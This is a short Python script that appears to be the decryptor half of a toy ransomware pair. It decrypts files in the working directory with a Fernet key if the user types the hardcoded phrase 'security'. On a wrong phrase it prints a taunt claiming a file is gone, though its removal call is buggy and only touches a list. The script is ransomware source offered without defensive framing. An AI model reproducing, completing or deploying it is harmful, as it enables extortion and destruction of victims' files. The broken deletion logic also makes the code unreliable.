import os
from cryptography.fernet import Fernet

filesDir = [] 

for file in os.listdir():
    if file == "helloworld.py" or file == "encrypt.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        filesDir.append(file)

secretword = "security"



with open("encrypt.key", "rb") as key:
    decryptkey = key.read()

user_input = input("Enter the secrey phrase to decrypt your files: ")
if user_input == secretword:
    for file in filesDir:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(decryptkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("Enjoy, the files are decrypted !!")

else:
    print("Nice Try! One file gone")
    filesDir.remove(0)


